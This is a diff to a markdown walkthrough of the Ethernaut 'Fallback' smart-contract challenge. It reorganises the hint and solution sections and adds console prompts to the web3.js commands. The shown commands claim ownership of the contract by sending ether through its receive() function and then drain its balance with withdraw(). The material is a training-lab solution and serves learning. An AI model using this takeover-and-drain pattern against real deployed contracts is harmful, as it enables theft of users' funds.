@@ -56,14 +56,6 @@ contract Fallback {
 * claim ownership of the contract
 * reduce its balance to 0
 
-<details>
-
-<summary>Key to solve this problem  🔑</summary>
-
-using `recieve` function
-
-</details>
-
 ### What you should know before
 
 * Sending transactions using `web3.js` **** \
@@ -71,7 +63,15 @@ using `recieve` function
 * Understanding concept of `fallback()` and `receive()` function \
   \-> see [here](https://www.youtube.com/watch?v=CMVC6Tp9gq4)
 
-## Walkthrough
+## Solution
+
+<details>
+
+<summary>Key to solve this problem  🔑</summary>
+
+using `recieve` function
+
+</details>
 
 ### 1. Claming Ownership
 
@@ -96,7 +96,7 @@ receive() external payable {
 
 ```javascript
 // You can send any value between 0 and 0.001 ether
-await contract.contribute({ value: 3 });
+> await contract.contribute({ value: 3 });
 ```
 
 #### 2) receive() function
@@ -104,7 +104,7 @@ await contract.contribute({ value: 3 });
 ```javascript
 // Here, since there's no require statement,
 // you can send any value bigger than 0.
-await contract.sendTransaction({ value: 3 });
+> await contract.sendTransaction({ value: 3 });
 ```
 
 &#x20;&#x20;
@@ -120,13 +120,13 @@ function withdraw() public onlyOwner {
 Since now we have **ownership** of the contract, we can **withdraw** all the balance of the contract.
 
 ```javascript
-await contract.withdraw();
+> await contract.withdraw();
 ```
 
 Let's check if we successfully drained the contract.
 
 ```javascript
-await web3.eth.getBalance(contract.address); // 0
+> await web3.eth.getBalance(contract.address); // 0
 ```
 
 Done! 😎
